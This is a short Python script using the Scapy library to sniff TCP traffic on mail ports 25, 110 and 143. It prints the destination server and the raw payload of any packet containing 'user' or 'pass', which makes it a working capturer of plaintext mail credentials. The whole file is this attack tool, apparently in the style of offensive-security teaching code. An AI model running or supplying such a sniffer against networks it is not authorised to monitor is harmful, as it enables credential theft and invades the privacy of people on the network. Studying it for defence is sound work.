from scapy.all import *


# Packet callback function
def packet_callback(packet):
    print("a")
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if ("user" in mail_packet.lower()) or ("pass" in mail_packet.lower()):
            print("[*] Server: {}".format(packet[IP].dst))
            print("[*] {}".format(packet[TCP].payload))


if __name__ == "__main__":
    sniff(filter="tcp and (port 25 or port 110 or port 143)", prn=packet_callback, store=0)
